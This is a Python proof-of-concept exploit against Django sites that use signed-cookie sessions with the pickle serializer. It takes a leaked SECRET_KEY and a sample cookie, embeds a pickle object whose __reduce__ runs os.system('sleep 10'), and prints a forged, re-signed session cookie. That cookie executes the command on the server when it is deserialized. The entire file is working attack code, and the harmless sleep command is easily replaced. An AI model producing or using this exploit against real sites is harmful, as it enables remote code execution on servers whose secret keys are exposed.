import os
import sys
from dotenv import load_dotenv
load_dotenv()
from django.core.signing import loads, dumps, BadSignature
from django.contrib.sessions import serializers
from empty import banner

# Clean the terminal, cmd and print the banner
os.system("cls") if os.name == "nt" else os.system("clear")
print(banner())


def __reduce__(self):
    return os.system, ("sleep 10",)


# Define a class using objects (In Python, everything is an object) :)
poc = type(
    "POC",
    (object,),
    {"__reduce__": __reduce__}
)

# Leaked SECRET KEY and Sample of cookie generated by target website
SECRET_KEY, COOKIE = os.environ.get("SECRET_KEY"), os.environ.get("COOKIE")

# Check if secret key match the cookie
try:
    newContent = loads(COOKIE, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                       salt='django.contrib.sessions.backends.signed_cookies')
except BadSignature:
    print("SECRET_KEY does not match the sample cookie")
    sys.exit()

# Instance of generated poc
newContent['testcookie'] = poc()

# Generate the exploit
exploit = dumps(newContent, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                salt='django.contrib.sessions.backends.signed_cookies', compress=True)

print(f"Exploit -> {exploit}")